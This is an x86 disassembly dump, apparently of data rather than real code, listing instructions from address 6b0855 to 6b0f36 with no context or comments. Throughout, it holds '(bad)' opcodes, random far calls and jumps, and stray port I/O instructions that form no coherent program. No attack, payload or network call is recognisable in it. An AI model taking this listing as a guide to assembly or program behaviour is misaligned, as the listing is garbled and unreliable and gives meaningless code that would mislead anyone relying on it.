  6b0855:	outs   dx,BYTE PTR ds:[esi]
  6b0856:	(bad)  [bx+si-0x6c]
  6b085a:	xor    edx,DWORD PTR [ecx+0x68]
  6b085d:	shl    edi,1
  6b085f:	cld    
  6b0860:	das    
  6b0861:	scas   eax,DWORD PTR es:[edi]
  6b0862:	and    eax,0x86238f69
  6b0867:	popa   
  6b0868:	mov    ebp,0xa1c8fac7
  6b086d:	jb     0x6b086b
  6b086f:	jb     0x6b0843
  6b0871:	inc    ebp
  6b0872:	mov    WORD PTR [eax],fs
  6b0874:	nop    ecx
  6b0877:	dec    eax
  6b0878:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b0879:	inc    esp
  6b087a:	xor    bh,BYTE PTR [ebp-0x1d]
  6b087d:	xchg   DWORD PTR [ebp-0x7e],ecx
  6b0880:	push   edx
  6b0881:	ja     0x6b084f
  6b0883:	enter  0xf942,0x4c
  6b0887:	and    esp,DWORD PTR [edx]
  6b0889:	lock mov al,0x1f
  6b088c:	jnp    0x6b0879
  6b088e:	es sahf 
  6b0890:	jecxz  0x6b08f1
  6b0892:	cs push es
  6b0894:	push   eax
  6b0895:	imul   ebp,eax,0x2738d64d
  6b089b:	push   ebx
  6b089c:	into   
  6b089d:	rcl    BYTE PTR [edi+ecx*1-0x4923c959],cl
  6b08a4:	and    BYTE PTR [ebp-0x52808469],0xb4
  6b08ab:	int3   
  6b08ac:	(bad)  
  6b08ad:	fist   DWORD PTR [ebp-0x18b67851]
  6b08b3:	fstp   QWORD PTR [esi+0x3de980a8]
  6b08b9:	test   BYTE PTR [eax],ch
  6b08bb:	sbb    al,0xac
  6b08bd:	push   ss
  6b08be:	or     eax,0xb88e879e
  6b08c3:	and    esp,edx
  6b08c5:	add    DWORD PTR [ecx+0x7bd7232b],ecx
  6b08cb:	xor    edi,ebp
  6b08cd:	cdq    
  6b08ce:	icebp  
  6b08cf:	mov    ds,WORD PTR [eax]
  6b08d1:	ret    0x18b1
  6b08d4:	jmp    0x6b08fc
  6b08d6:	ret    
  6b08d7:	mov    cl,0x9a
  6b08d9:	dec    esi
  6b08da:	sahf   
  6b08db:	or     al,bh
  6b08dd:	adc    esp,ecx
  6b08df:	mov    ?,WORD PTR [esi-0x6c7a9a77]
  6b08e5:	dec    ecx
  6b08e6:	mov    DWORD PTR [esi-0x7b],eax
  6b08e9:	in     eax,0x81
  6b08eb:	sbb    BYTE PTR [eax],bh
  6b08ed:	xchg   esp,eax
  6b08ee:	mov    DWORD PTR [edx-0x34a9eb7d],esi
  6b08f4:	fcomp  st(1)
  6b08f6:	rcl    esi,cl
  6b08f8:	jmp    0x6b0949
  6b08fa:	out    dx,eax
  6b08fb:	and    bl,bl
  6b08fd:	add    BYTE PTR [esi],cl
  6b08ff:	xchg   ebx,eax
  6b0900:	mov    ?,ebp
  6b0902:	mov    dl,0x3c
  6b0904:	stc    
  6b0905:	push   es
  6b0906:	push   es
  6b0907:	pop    ebx
  6b0908:	xor    eax,DWORD PTR [ecx]
  6b090a:	push   edx
  6b090b:	test   BYTE PTR [esi-0x19],cl
  6b090e:	xchg   edx,eax
  6b090f:	pop    edi
  6b0910:	mov    edi,0x9f5a779a
  6b0915:	cld    
  6b0916:	mov    dh,0xd1
  6b0918:	inc    ebp
  6b0919:	cdq    
  6b091a:	lea    esi,[ebp+0x48e1334c]
  6b0920:	retf   
  6b0921:	jbe    0x6b08c9
  6b0923:	outs   dx,DWORD PTR ds:[esi]
  6b0924:	daa    
  6b0925:	and    eax,0x840638ea
  6b092a:	cmp    eax,0x867be447
  6b092f:	dec    ebp
  6b0930:	jo     0x6b095d
  6b0932:	das    
  6b0933:	mov    dl,0x26
  6b0935:	jne    0x6b0913
  6b0937:	ss jmp 0xce4f28a6
  6b093d:	cmp    BYTE PTR ds:0x9aee503d,bl
  6b0943:	or     eax,0xc21dae1
  6b0948:	das    
  6b0949:	leave  
  6b094a:	xchg   edi,eax
  6b094b:	xchg   ebp,eax
  6b094c:	push   es
  6b094d:	push   es
  6b094e:	(bad)  
  6b094f:	fisttp QWORD PTR [ecx+0x73]
  6b0952:	mov    gs,WORD PTR [edi-0x2f80a0de]
  6b0958:	push   cs
  6b0959:	xor    esp,edi
  6b095b:	rol    DWORD PTR [ecx],0xb1
  6b095e:	or     cl,BYTE PTR [edx+0x21537a6]
  6b0964:	push   esi
  6b0965:	lahf   
  6b0966:	sti    
  6b0967:	mov    gs,ebp
  6b0969:	or     BYTE PTR [edx-0x5abe83df],bh
  6b096f:	pop    ebx
  6b0970:	scas   eax,DWORD PTR es:[edi]
  6b0971:	dec    ecx
  6b0972:	and    ch,BYTE PTR [esi+esi*8-0x14db2493]
  6b0979:	ret    0x199a
  6b097c:	out    0x2b,al
  6b097e:	adc    DWORD PTR [ebp+0x54],edx
  6b0981:	jns    0x6b0940
  6b0983:	xlat   BYTE PTR ds:[ebx]
  6b0984:	(bad)  
  6b0985:	xlat   BYTE PTR ds:[ebx]
  6b0986:	xchg   edi,eax
  6b0987:	stos   DWORD PTR es:[edi],eax
  6b0988:	cmp    BYTE PTR cs:[esi+0x61],dl
  6b098c:	inc    edi
  6b098d:	imul   BYTE PTR [ebx+0x38]
  6b0990:	pop    es
  6b0991:	ror    DWORD PTR [ecx],cl
  6b0993:	pop    ebp
  6b0994:	inc    edi
  6b0995:	lea    edx,[esi]
  6b0997:	mov    ebx,0xde3d44d2
  6b099c:	fwait
  6b099d:	mov    al,0xf3
  6b099f:	xchg   ecx,eax
  6b09a0:	(bad)  
  6b09a1:	(bad)  
  6b09a2:	xor    edi,DWORD PTR [ecx-0x2d]
  6b09a5:	(bad)  
  6b09a6:	mov    ds:0x83a5cd8d,eax
  6b09ab:	mov    DWORD PTR [esi],ebx
  6b09ad:	ins    BYTE PTR es:[edi],dx
  6b09ae:	jnp    0x6b0a0d
  6b09b0:	stc    
  6b09b1:	pushf  
  6b09b2:	loope  0x6b094d
  6b09b4:	pop    edi
  6b09b5:	std    
  6b09b6:	cmp    eax,0xe542c40
  6b09bb:	jnp    0x6b0a30
  6b09bd:	sbb    dl,BYTE PTR [eax-0x5b]
  6b09c0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b09c1:	scas   eax,DWORD PTR es:[edi]
  6b09c2:	jae    0x6b096b
  6b09c4:	push   es
  6b09c5:	pop    ds
  6b09c6:	mov    eax,0xe9596cbc
  6b09cb:	jne    0x6b09da
  6b09cd:	retf   
  6b09ce:	jmp    0x7178f9dc
  6b09d3:	jnp    0x6b0a24
  6b09d5:	lahf   
  6b09d6:	fs (bad) 
  6b09d9:	pusha  
  6b09da:	mov    bl,0xc8
  6b09dc:	push   ebp
  6b09dd:	hlt    
  6b09de:	rcr    BYTE PTR [ecx],cl
  6b09e0:	je     0x6b0a5a
  6b09e2:	cdq    
  6b09e3:	bound  ebx,QWORD PTR [ebx]
  6b09e5:	lods   eax,DWORD PTR ds:[esi]
  6b09e6:	inc    BYTE PTR [ebx+0x19]
  6b09e9:	adc    ah,ah
  6b09eb:	call   0x334fdbdf
  6b09f0:	test   eax,0xef2cc600
  6b09f5:	call   0x9c82:0x6c3f0031
  6b09fc:	cmp    cl,BYTE PTR ds:0x7cd760a4
  6b0a02:	popa   
  6b0a03:	outs   dx,DWORD PTR ds:[esi]
  6b0a04:	sbb    edx,DWORD PTR [ecx-0x56d0805e]
  6b0a0a:	in     al,dx
  6b0a0b:	push   0x31d789ed
  6b0a10:	repz out 0xfd,al
  6b0a13:	cmp    bh,cl
  6b0a15:	sub    edx,ecx
  6b0a17:	push   ds
  6b0a18:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b0a19:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  6b0a1a:	stos   DWORD PTR es:[edi],eax
  6b0a1b:	scas   al,BYTE PTR es:[edi]
  6b0a1c:	test   eax,0x4ae88ef2
  6b0a21:	sub    BYTE PTR [edx+ebx*2-0x79],0xeb
  6b0a26:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b0a28:	sub    eax,0x4d581e49
  6b0a2d:	push   esp
  6b0a2e:	mov    eax,0x422993c0
  6b0a33:	js     0x6b0a3c
  6b0a35:	int    0x36
  6b0a37:	and    bh,BYTE PTR [esi-0x5b]
  6b0a3a:	push   0x3e
  6b0a3c:	iret   
  6b0a3d:	cs mov bl,0x7e
  6b0a40:	stos   BYTE PTR es:[edi],al
  6b0a41:	ret    
  6b0a42:	dec    eax
  6b0a43:	test   BYTE PTR [ebx],dl
  6b0a45:	popa   
  6b0a46:	jl     0x6b09f6
  6b0a48:	fcmovnbe st,st(3)
  6b0a4a:	mov    BYTE PTR [esi],ah
  6b0a4c:	out    dx,eax
  6b0a4d:	jne    0x6b0a72
  6b0a4f:	popf   
  6b0a50:	mov    al,ds:0x6f2777f6
  6b0a55:	mov    ebp,0x38f952ee
  6b0a5a:	cmc    
  6b0a5b:	mov    WORD PTR [ebx+0x60e1fc10],ds
  6b0a61:	lods   eax,DWORD PTR ds:[esi]
  6b0a62:	ret    0x4152
  6b0a65:	jo     0x6b0a5d
  6b0a67:	neg    DWORD PTR [eax+0x39bcf800]
  6b0a6d:	push   es
  6b0a6e:	jo     0x6b0a04
  6b0a70:	pop    ecx
  6b0a71:	sbb    DWORD PTR [edi],0xcda75ba1
  6b0a77:	rcr    DWORD PTR [ecx+0x102e5eb1],1
  6b0a7d:	jbe    0x6b0ad6
  6b0a7f:	mov    bl,0x50
  6b0a81:	mov    edx,0x69a69cf2
  6b0a86:	inc    edi
  6b0a87:	call   0xeced:0x9d23e68f
  6b0a8e:	retf   
  6b0a8f:	add    BYTE PTR [esi+eiz*4+0x20e14f31],0x6
  6b0a97:	repz ror DWORD PTR [edi+0x5c],cl
  6b0a9b:	jno    0x6b0a5d
  6b0a9d:	in     eax,0xf0
  6b0a9f:	pop    eax
  6b0aa0:	ds xchg edi,eax
  6b0aa2:	sub    ebp,edi
  6b0aa4:	in     al,0xb
  6b0aa6:	xor    DWORD PTR [eax],ecx
  6b0aa8:	mov    edx,0xf1c43800
  6b0aad:	adc    edi,esp
  6b0aaf:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b0ab0:	add    al,0x5f
  6b0ab2:	ins    DWORD PTR es:[edi],dx
  6b0ab3:	adc    BYTE PTR ss:[esi-0x47db6df4],al
  6b0aba:	stos   BYTE PTR es:[edi],al
  6b0abb:	stos   BYTE PTR es:[edi],al
  6b0abc:	call   0xeb2e33ad
  6b0ac1:	sahf   
  6b0ac2:	(bad)  
  6b0ac3:	jl     0x6b0aab
  6b0ac5:	add    eax,0xd51bc01
  6b0aca:	sbb    esi,eax
  6b0acc:	(bad)  
  6b0acd:	xchg   edx,eax
  6b0ace:	fist   WORD PTR [ecx-0x5538a411]
  6b0ad4:	outs   dx,DWORD PTR ds:[esi]
  6b0ad5:	xlat   BYTE PTR ds:[ebx]
  6b0ad6:	dec    esp
  6b0ad7:	sbb    edi,ecx
  6b0ad9:	push   ds
  6b0ada:	jb     0x6b0aff
  6b0adc:	sub    eax,edx
  6b0ade:	cmp    DWORD PTR [ebp-0x32b5f1b9],ebp
  6b0ae4:	aaa    
  6b0ae5:	in     eax,0x62
  6b0ae7:	and    ah,BYTE PTR [edx]
  6b0ae9:	jo     0x6b0b0e
  6b0aeb:	aad    0x73
  6b0aed:	outs   dx,DWORD PTR ds:[esi]
  6b0aee:	push   esi
  6b0aef:	cmp    ebp,DWORD PTR [ecx-0x2ab04a8f]
  6b0af5:	es jo  0x6b0b17
  6b0af8:	int    0x2b
  6b0afa:	sar    cl,cl
  6b0afc:	test   al,0x80
  6b0afe:	jle    0x6b0b12
  6b0b00:	ror    DWORD PTR [edi+0x5f],cl
  6b0b03:	imul   eax,DWORD PTR [ebx-0xe640252],0xb676b9d1
  6b0b0d:	out    0xa7,al
  6b0b0f:	out    dx,al
  6b0b10:	mov    eax,0xd29ba781
  6b0b15:	(bad)  
  6b0b17:	sub    al,0x36
  6b0b19:	inc    ebp
  6b0b1a:	jge    0x6b0b0f
  6b0b1c:	ds sub al,0x69
  6b0b1f:	loopne 0x6b0ac1
  6b0b21:	cwde   
  6b0b22:	popa   
  6b0b23:	das    
  6b0b24:	inc    ebx
  6b0b25:	fcomp  QWORD PTR [edi-0x22]
  6b0b28:	cmc    
  6b0b29:	mov    cl,al
  6b0b2b:	add    edx,edx
  6b0b2d:	daa    
  6b0b2e:	sbb    eax,0x80c48d8f
  6b0b33:	in     eax,0xde
  6b0b35:	mov    DWORD PTR [eax+0x29d8a8e3],edx
  6b0b3b:	pop    esi
  6b0b3c:	mov    ecx,0x50a525f5
  6b0b41:	jmp    FWORD PTR [eax+ebp*2]
  6b0b44:	and    ebp,ebp
  6b0b46:	push   0xb2d58366
  6b0b4b:	stc    
  6b0b4c:	aas    
  6b0b4d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b0b4e:	aad    0x60
  6b0b50:	scas   al,BYTE PTR es:[edi]
  6b0b51:	mov    edi,0xa28fb811
  6b0b56:	(bad)  
  6b0b57:	and    al,0x2d
  6b0b59:	pop    ebp
  6b0b5a:	jno    0x6b0b9f
  6b0b5c:	ins    DWORD PTR es:[edi],dx
  6b0b5d:	out    dx,al
  6b0b5e:	pop    edx
  6b0b5f:	lods   eax,DWORD PTR ds:[esi]
  6b0b60:	rcl    DWORD PTR [ebx-0x7a3e62d],0x26
  6b0b67:	adc    cl,ch
  6b0b69:	aas    
  6b0b6a:	arpl   WORD PTR [ebp-0x7a6a99d],bp
  6b0b70:	enter  0x2129,0x74
  6b0b74:	(bad)  
  6b0b75:	std    
  6b0b76:	pop    edx
  6b0b77:	iret   
  6b0b78:	xchg   ebx,eax
  6b0b79:	fisubr DWORD PTR [esi+0x3a05c4a3]
  6b0b7f:	mov    bh,0x4f
  6b0b81:	test   DWORD PTR [esi-0x6c8c1bbf],ebp
  6b0b87:	push   ecx
  6b0b88:	lea    ecx,[esi+0x6bb7e637]
  6b0b8e:	and    ah,al
  6b0b90:	outs   dx,BYTE PTR ds:[esi]
  6b0b91:	or     al,bl
  6b0b93:	add    eax,0xbc1e4c28
  6b0b98:	int3   
  6b0b99:	pop    ebp
  6b0b9a:	and    DWORD PTR [edi],edi
  6b0b9c:	fnstsw WORD PTR [ebp-0x48]
  6b0b9f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b0ba0:	aam    0x69
  6b0ba2:	es jp  0x6b0bb6
  6b0ba5:	add    DWORD PTR [edx+ebx*8-0x7f04efff],ebp
  6b0bac:	ds xor eax,0xbdd3a348
  6b0bb2:	iret   
  6b0bb3:	sar    ebp,0x20
  6b0bb6:	imul   esi,DWORD PTR [edx+edx*4-0x12],0x37
  6b0bbb:	psubq  mm3,QWORD PTR [ebx]
  6b0bbe:	dec    edx
  6b0bbf:	jb     0x6b0bd8
  6b0bc1:	fwait
  6b0bc2:	scas   al,BYTE PTR es:[edi]
  6b0bc3:	sbb    edi,DWORD PTR [edi+0x17]
  6b0bc6:	xor    al,0xa1
  6b0bc8:	es loopne 0x6b0b6f
  6b0bcb:	mov    bl,BYTE PTR [edx+0x5b47cc98]
  6b0bd1:	pop    ss
  6b0bd2:	mov    BYTE PTR [eax],dl
  6b0bd4:	mov    DWORD PTR [edi-0x76],ebp
  6b0bd7:	or     eax,0xce869d55
  6b0bdc:	sti    
  6b0bdd:	jmp    0xeaf2:0xb0782902
  6b0be4:	cli    
  6b0be5:	add    eax,0x1ec1700
  6b0bea:	inc    edi
  6b0beb:	das    
  6b0bec:	(bad)  
  6b0bed:	pop    ebp
  6b0bee:	jmp    0x6b0b7a
  6b0bf0:	sbb    DWORD PTR [edi+0x54],0x269344f8
  6b0bf7:	fucomi st,st(6)
  6b0bf9:	ins    DWORD PTR es:[edi],dx
  6b0bfa:	jmp    0x6b0b87
  6b0bfc:	js     0x6b0c0c
  6b0bfe:	sbb    dl,ch
  6b0c00:	xchg   edi,eax
  6b0c01:	retf   
  6b0c02:	inc    edi
  6b0c03:	sub    BYTE PTR [edx],bl
  6b0c05:	xor    eax,0x4216c9da
  6b0c0a:	cmp    al,0x76
  6b0c0c:	cmp    bl,cl
  6b0c0e:	arpl   dx,sp
  6b0c10:	xchg   esi,eax
  6b0c11:	pop    esi
  6b0c12:	dec    ebp
  6b0c13:	sbb    al,0x6d
  6b0c15:	sub    al,0xb
  6b0c17:	cmp    esi,DWORD PTR [ecx+esi*4+0x7131a79b]
  6b0c1e:	cmp    ebx,DWORD PTR ds:0x2d645d37
  6b0c24:	test   BYTE PTR [si],0x1a
  6b0c28:	in     al,dx
  6b0c29:	pushf  
  6b0c2a:	aas    
  6b0c2b:	sbb    esi,esp
  6b0c2d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  6b0c2e:	es xor al,0xb
  6b0c31:	cmp    dl,BYTE PTR [edx-0x1b]
  6b0c34:	mov    ch,dl
  6b0c36:	sub    ecx,DWORD PTR [eax]
  6b0c38:	sub    ebp,ebp
  6b0c3a:	dec    esi
  6b0c3b:	mov    cl,0x12
  6b0c3d:	out    0xb4,eax
  6b0c3f:	pop    ecx
  6b0c40:	xchg   ebp,eax
  6b0c41:	pop    es
  6b0c42:	les    ebx,FWORD PTR [ecx-0xe]
  6b0c45:	pop    eax
  6b0c46:	bound  esp,QWORD PTR [eax+0x2f]
  6b0c49:	fs (bad) 
  6b0c4b:	adc    edx,DWORD PTR [esi]
  6b0c4d:	repnz lds ebx,FWORD PTR [esi]
  6b0c50:	adc    dh,BYTE PTR [ebp+ebx*8-0x20d11a52]
  6b0c57:	or     BYTE PTR [edi+edx*4+0x55],0xe7
  6b0c5c:	xchg   ebx,eax
  6b0c5d:	inc    edi
  6b0c5e:	out    dx,eax
  6b0c5f:	dec    eax
  6b0c60:	mov    eax,ds:0x78541eda
  6b0c65:	fwait
  6b0c66:	mov    dl,dl
  6b0c68:	pop    ds
  6b0c69:	sar    DWORD PTR [ebp+0x7ec93bd0],1
  6b0c6f:	ds jp  0x6b0c34
  6b0c72:	jg     0x6b0c4a
  6b0c74:	adc    ah,dl
  6b0c76:	nop
  6b0c77:	mov    ecx,0x2cd67dd3
  6b0c7c:	call   0x6d56:0x28f2b715
  6b0c83:	aad    0xbf
  6b0c85:	mov    eax,ds:0xd4d9abb2
  6b0c8a:	aam    0x7
  6b0c8c:	in     eax,0x80
  6b0c8e:	and    dh,ch
  6b0c90:	je     0x6b0cbb
  6b0c92:	(bad)  
  6b0c93:	int3   
  6b0c94:	fcom   DWORD PTR [edi-0x3f7a9fbd]
  6b0c9a:	call   0xa02e:0xcc479158
  6b0ca1:	xchg   esi,eax
  6b0ca2:	ret    
  6b0ca3:	pop    eax
  6b0ca4:	adc    al,0xf4
  6b0ca6:	mov    al,ds:0x95d0fb41
  6b0cab:	outs   dx,BYTE PTR ds:[esi]
  6b0cac:	ds in  eax,0xe3
  6b0caf:	enter  0x83a4,0x80
  6b0cb3:	outs   dx,DWORD PTR ds:[esi]
  6b0cb4:	rcr    bl,0x73
  6b0cb7:	fucomi st,st(1)
  6b0cb9:	cmp    ecx,DWORD PTR [ebp-0x5]
  6b0cbc:	stc    
  6b0cbd:	mov    ebp,0x5865050d
  6b0cc2:	xchg   edx,eax
  6b0cc3:	jns    0x6b0c49
  6b0cc5:	push   ebx
  6b0cc6:	jnp    0x6b0cff
  6b0cc8:	or     cl,ah
  6b0cca:	leave  
  6b0ccb:	clc    
  6b0ccc:	jns    0x6b0cb5
  6b0cce:	cmp    al,0x98
  6b0cd0:	push   edi
  6b0cd1:	clc    
  6b0cd2:	push   esi
  6b0cd3:	xchg   esi,eax
  6b0cd4:	sub    al,0x91
  6b0cd7:	sub    DWORD PTR [eax+0x3f],ebx
  6b0cda:	adc    BYTE PTR [edi+0x3bfd63f8],bl
  6b0ce0:	je     0x6b0d5a
  6b0ce2:	sar    BYTE PTR [ebx-0x7a],cl
  6b0ce5:	loope  0x6b0c95
  6b0ce7:	repnz xchg esp,eax
  6b0ce9:	inc    DWORD PTR [ecx+ebx*4-0x3b]
  6b0ced:	mov    eax,ds:0x9dc50aac
  6b0cf2:	sahf   
  6b0cf3:	rcl    DWORD PTR [ecx],cl
  6b0cf5:	sub    esi,esp
  6b0cf7:	retf   0xb488
  6b0cfa:	jno    0x6b0cec
  6b0cfc:	test   al,0x67
  6b0cfe:	jno    0x6b0d74
  6b0d00:	jne    0x6b0cb8
  6b0d02:	ficom  WORD PTR [eax+ecx*4]
  6b0d05:	jmp    0x6b0d3c
  6b0d07:	je     0x6b0d5c
  6b0d09:	loopne 0x6b0d70
  6b0d0b:	fwait
  6b0d0c:	mov    eax,fs:0x1db2e7f8
  6b0d12:	mov    esi,DWORD PTR [esi]
  6b0d14:	(bad)  
  6b0d15:	add    BYTE PTR ds:0xda663a59,dh
  6b0d1b:	int    0x78
  6b0d1d:	xchg   ebp,eax
  6b0d1e:	popf   
  6b0d1f:	adc    ah,ch
  6b0d21:	jnp    0x6b0cbb
  6b0d23:	mov    dl,0xd9
  6b0d25:	fstp   TBYTE PTR [edi+edi*2]
  6b0d28:	in     al,0xb3
  6b0d2a:	xchg   BYTE PTR [ecx+0x63bafbe8],ch
  6b0d30:	cmc    
  6b0d31:	cld    
  6b0d32:	mov    edx,0x28607039
  6b0d37:	addr16 call 0xeca54314
  6b0d3d:	push   ss
  6b0d3e:	not    esi
  6b0d40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b0d41:	lods   al,BYTE PTR ds:[esi]
  6b0d42:	cmp    eax,0x1ff551b3
  6b0d47:	pusha  
  6b0d48:	retf   0x1fbc
  6b0d4b:	mov    ah,0x31
  6b0d4d:	mov    eax,ds:0xa9b678bd
  6b0d52:	xchg   DWORD PTR [esi],ecx
  6b0d54:	sub    BYTE PTR [ebx+0xf493ee5],ch
  6b0d5a:	shl    DWORD PTR [ecx+0x3e089ceb],0xb3
  6b0d61:	mov    al,BYTE PTR [esp+ecx*4-0x3b]
  6b0d65:	ins    DWORD PTR es:[edi],dx
  6b0d66:	pushf  
  6b0d67:	push   0x2d
  6b0d69:	dec    eax
  6b0d6a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  6b0d6b:	loope  0x6b0d85
  6b0d6d:	sub    esp,DWORD PTR [edi]
  6b0d6f:	or     BYTE PTR [ebx-0x6cbddc44],ch
  6b0d75:	and    eax,0xae3bef05
  6b0d7a:	cmc    
  6b0d7b:	sbb    al,0x9a
  6b0d7d:	xor    al,0xcc
  6b0d7f:	shr    bh,cl
  6b0d81:	rcl    ch,cl
  6b0d83:	pop    ebx
  6b0d84:	push   0x27827596
  6b0d89:	adc    eax,0x78b652
  6b0d8e:	jno    0x6b0d89
  6b0d90:	popa   
  6b0d91:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  6b0d92:	aas    
  6b0d93:	push   ds
  6b0d94:	outs   dx,BYTE PTR ds:[esi]
  6b0d95:	inc    edi
  6b0d96:	mov    edi,0x38128206
  6b0d9b:	mov    edi,0x300fca7d
  6b0da0:	sbb    dl,al
  6b0da2:	int3   
  6b0da3:	and    eax,0x9183150e
  6b0da8:	das    
  6b0da9:	test   al,0xea
  6b0dab:	pop    es
  6b0dac:	loopne 0x6b0e11
  6b0dae:	adc    ebp,ebp
  6b0db0:	mov    ds:0x2644d162,al
  6b0db5:	sar    cl,1
  6b0db7:	inc    esp
  6b0db8:	and    ebx,0xffffffde
  6b0dbb:	lods   al,BYTE PTR ds:[esi]
  6b0dbc:	mov    DWORD PTR [edi+0x37],eax
  6b0dbf:	push   ecx
  6b0dc0:	cwd    
  6b0dc2:	mov    ds:0xa0d37e75,eax
  6b0dc7:	mov    dh,0x8e
  6b0dc9:	shl    BYTE PTR [esi],1
  6b0dcb:	push   ecx
  6b0dcc:	dec    ecx
  6b0dcd:	jno    0x6b0d6f
  6b0dcf:	mov    esp,0xb07f4cda
  6b0dd4:	arpl   WORD PTR [ebp-0x27],ax
  6b0dd7:	cmp    al,0x89
  6b0dd9:	xchg   edi,eax
  6b0dda:	mov    BYTE PTR [esi+ebx*8+0x65],ah
  6b0dde:	fistp  WORD PTR [edi+0x1cd8c753]
  6b0de4:	dec    ebx
  6b0de5:	dec    edi
  6b0de6:	sbb    ah,al
  6b0de8:	lea    edx,[eax]
  6b0dea:	(bad)  
  6b0dec:	hlt    
  6b0ded:	mov    edi,0x1bf60f97
  6b0df2:	cld    
  6b0df3:	jae    0x6b0dd0
  6b0df5:	adc    eax,ebx
  6b0df7:	fild   QWORD PTR [esi-0x73d12391]
  6b0dfd:	stc    
  6b0dfe:	mov    WORD PTR [edi],gs
  6b0e00:	add    BYTE PTR [ebp+0x3],ah
  6b0e03:	mov    ds:0xccc842ae,eax
  6b0e08:	xor    BYTE PTR [edx],0x88
  6b0e0b:	and    eax,0x509938fa
  6b0e10:	pop    esi
  6b0e11:	push   esi
  6b0e12:	sbb    DWORD PTR [esi+0x743edfc1],0x3f6145ed
  6b0e1c:	or     BYTE PTR [ecx-0x2978ce7b],ch
  6b0e22:	mov    edx,edi
  6b0e24:	ret    
  6b0e25:	push   ds
  6b0e26:	mov    bh,0xc9
  6b0e28:	in     eax,0x43
  6b0e2a:	lods   eax,DWORD PTR ds:[esi]
  6b0e2b:	mov    al,0xd9
  6b0e2d:	ret    0x7711
  6b0e30:	adc    al,0xd1
  6b0e32:	outs   dx,DWORD PTR ds:[esi]
  6b0e33:	fs push ss
  6b0e35:	cmp    al,0x5c
  6b0e37:	adc    al,0x11
  6b0e39:	push   0x51
  6b0e3b:	pop    edi
  6b0e3c:	xor    DWORD PTR [esp+edx*4],0xffffff80
  6b0e40:	scas   eax,DWORD PTR es:[edi]
  6b0e41:	xor    eax,0x31cebccc
  6b0e46:	sub    al,0xd2
  6b0e48:	dec    eax
  6b0e49:	xchg   edi,eax
  6b0e4a:	cdq    
  6b0e4b:	rcl    esi,0x42
  6b0e4e:	pop    esp
  6b0e4f:	inc    ecx
  6b0e50:	push   DWORD PTR [esi-0x3b64467f]
  6b0e56:	cmc    
  6b0e57:	mov    WORD PTR [ebp+0x1dffa0e2],ss
  6b0e5d:	xor    BYTE PTR [ecx-0x60],dh
  6b0e60:	push   0x33b51f4f
  6b0e65:	cmp    eax,0x57573cda
  6b0e6a:	fs repnz sub BYTE PTR ds:[ebx+0x5497d5ab],ch
  6b0e73:	iret   
  6b0e74:	mov    dh,0x35
  6b0e76:	fs loopne 0x6b0e1f
  6b0e79:	mov    dh,dh
  6b0e7b:	les    esi,FWORD PTR [edi-0x3a265516]
  6b0e81:	ja     0x6b0eb4
  6b0e83:	loop   0x6b0e4f
  6b0e85:	jmp    0xd680:0x20fd727e
  6b0e8c:	push   DWORD PTR [esi-0x10]
  6b0e8f:	inc    ecx
  6b0e90:	push   ebp
  6b0e91:	sub    ebp,esp
  6b0e93:	sbb    al,0x5d
  6b0e95:	das    
  6b0e96:	icebp  
  6b0e97:	pop    ebx
  6b0e98:	xlat   BYTE PTR ds:[ebx]
  6b0e99:	xchg   esi,eax
  6b0e9a:	cdq    
  6b0e9b:	into   
  6b0e9c:	test   BYTE PTR [esi],bh
  6b0e9e:	lahf   
  6b0e9f:	arpl   WORD PTR [edi+0x623c1c5e],di
  6b0ea5:	aad    0xa1
  6b0ea7:	ror    dh,0xcb
  6b0eaa:	ins    DWORD PTR es:[edi],dx
  6b0eab:	and    BYTE PTR [esi],0xa7
  6b0eae:	ror    DWORD PTR [ebx],1
  6b0eb0:	mov    bh,0xc6
  6b0eb2:	cld    
  6b0eb3:	ins    BYTE PTR es:[edi],dx
  6b0eb4:	das    
  6b0eb5:	neg    ecx
  6b0eb7:	dec    esi
  6b0eb8:	pop    ebx
  6b0eb9:	(bad)  
  6b0eba:	fsub   QWORD PTR [ebp+edi*8-0x6d]
  6b0ebe:	fcmovnu st,st(6)
  6b0ec0:	push   ss
  6b0ec1:	dec    edx
  6b0ec2:	addr16 push edi
  6b0ec4:	adc    DWORD PTR [ebp+0x661a005b],0xac183121
  6b0ece:	(bad)  
  6b0ecf:	push   ecx
  6b0ed0:	push   ebp
  6b0ed1:	int3   
  6b0ed2:	xor    edx,ebp
  6b0ed4:	inc    edi
  6b0ed5:	pop    ebx
  6b0ed6:	add    edx,0x5c5ba73f
  6b0edc:	mov    ds:0xd8f39540,eax
  6b0ee1:	add    BYTE PTR [ebx-0x1171aa53],ch
  6b0ee7:	imul   edx,edx,0xf0631ebc
  6b0eed:	sub    BYTE PTR [ebx-0x2b1f5158],dh
  6b0ef3:	outs   dx,DWORD PTR ds:[esi]
  6b0ef4:	mov    esi,0x4eb78180
  6b0ef9:	int3   
  6b0efa:	jmp    0x3b2ddc5b
  6b0eff:	mov    al,ds:0x173e8c9b
  6b0f04:	les    esi,FWORD PTR [esi+0x56]
  6b0f07:	(bad)  
  6b0f09:	gs daa 
  6b0f0b:	mov    cl,0x36
  6b0f0d:	lods   al,BYTE PTR ds:[esi]
  6b0f0e:	lds    ebx,FWORD PTR [esi+edi*4]
  6b0f11:	pop    edi
  6b0f12:	or     esp,edx
  6b0f14:	mov    eax,0xda11fff9
  6b0f19:	xchg   esp,eax
  6b0f1a:	jnp    0x6b0ed7
  6b0f1c:	adc    DWORD PTR ds:0x97ca7bc9,esp
  6b0f22:	adc    esp,DWORD PTR [eax+edx*4+0x62]
  6b0f26:	or     al,0xf3
  6b0f28:	dec    edx
  6b0f29:	popa   
  6b0f2a:	xchg   esp,eax
  6b0f2b:	push   0xffffff81
  6b0f2d:	jbe    0x6b0eb5
  6b0f2f:	xor    eax,0xdc1aa23b
  6b0f34:	sahf   
  6b0f35:	pop    ebp
  6b0f36:	jecxz  0x6b0f5f
